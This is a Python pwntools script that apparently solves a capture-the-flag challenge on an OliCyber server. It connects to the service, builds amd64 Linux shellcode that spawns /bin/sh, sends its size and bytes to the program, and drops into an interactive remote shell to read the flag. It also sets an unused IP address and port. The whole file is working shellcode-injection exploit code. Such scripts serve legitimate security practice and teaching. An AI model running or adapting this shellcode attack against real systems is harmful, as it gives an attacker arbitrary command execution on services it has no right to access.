#!/usr/bin/env python3
from pwn import *

HOST = "software-20.challs.olicyber.it"
PORT = 13003

r = remote(HOST, PORT)
r.sendlineafter(b"... Invia un qualsiasi carattere per iniziare ...", b"1")

H = "130.136.4.142"
P = 1234

try:
    # Create a shellcode to open a shell and read the flag
    asm_code = shellcraft.amd64.linux.sh()
    shellcode = asm(asm_code, arch='x86_64')

    # Send the size of the shellcode when prompted
    r.sendlineafter(b"Shellcode size (max 4096): ",
                    str(len(shellcode)).encode())

    # Send the shellcode when prompted for exact bytes
    r.sendlineafter(b"Send me exactly", shellcode)

    r.interactive()

    # Get the flag
    flag = r.recvall().decode()
    print(f"Flag: {flag}")

except Exception as e:
    print(f"Error: {e}")
finally:
    r.close()
